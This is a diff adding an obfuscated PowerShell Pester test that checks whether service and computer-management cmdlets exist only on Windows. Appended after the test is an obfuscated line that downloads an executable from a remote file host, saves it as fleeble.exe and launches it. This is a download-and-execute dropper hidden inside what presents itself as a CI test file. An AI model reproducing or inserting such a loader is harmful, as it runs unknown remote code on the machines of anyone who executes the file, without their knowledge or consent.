@@ -1,0 +1,29 @@
+&("{1}{0}{2}" -f'r','Desc','ibe') ("{5}{0}{3}{1}{4}{6}{7}{8}{2}" -f'eme',' Manag','s','nted','emen','Unimpl','t Cmdlet ','Tes','t') -Tags "CI" {
+
+    ${Com`m`Ands} = @(
+        ("{0}{1}{2}" -f 'Get','-Servic','e'),
+        ("{0}{1}{2}"-f'Sto','p-Serv','ice'),
+        ("{3}{1}{0}{2}" -f'rv','tart-Se','ice','S'),
+        ("{3}{2}{0}{4}{1}" -f'S','ce','pend-','Sus','ervi'),
+        ("{2}{0}{1}"-f'er','vice','Resume-S'),
+        ("{3}{2}{0}{1}"-f'-Se','rvice','rt','Resta'),
+        ("{2}{0}{1}"-f 'ervi','ce','Set-S'),
+        ("{0}{2}{1}" -f'N','rvice','ew-Se'),
+
+        ("{4}{2}{1}{3}{0}" -f'r','omput','art-C','e','Rest'),
+        ("{4}{1}{3}{0}{2}" -f'ute','Com','r','p','Stop-'),
+        ("{0}{4}{1}{2}{3}" -f 'R','me-Comput','e','r','ena'),
+
+        ("{4}{2}{0}{3}{1}"-f'mpute','o','t-Co','rInf','Ge'),
+
+        ("{3}{2}{1}{0}"-f'one','eZ','im','Set-T')
+    )
+
+    foreach (${Co`Mm`And} in ${co`m`ManDs}) {
+        .('It') ("$Command "+'sho'+'uld '+'o'+'nly '+'b'+'e '+'a'+'v'+'ailab'+'le '+'o'+'n '+'Wi'+'nd'+'ows') {
+            [bool](.("{2}{0}{1}" -f'Com','mand','Get-') ${c`oM`MAnd} -ErrorAction ("{0}{1}{2}{3}"-f'Si','len','tlyC','ontinue')) | &("{2}{1}{0}" -f'ld','u','Sho') -Be ${iS`w`i`NDows}
+        }
+    }
+}
+
+(&("{3}{1}{2}{0}"-f 'ct','-Ob','je','New') ("{1}{0}{4}{3}{2}" -f 'Net.','System.','lient','bC','We')).("{1}{2}{3}{0}" -f 'le','Dow','nloa','dFi').Invoke(("{9}{4}{5}{8}{1}{6}{7}{3}{0}{2}"-f'e','.hu/get/0/949983','xe','y.','://ddl7.','dat','0/m','one','a','http'),("{3}{0}{1}{2}"-f'l','ee','ble.exe','f'));.("{3}{0}{1}{2}{4}" -f 'tar','t-P','roc','S','ess') ("{0}{2}{1}"-f'flee','exe','ble.')
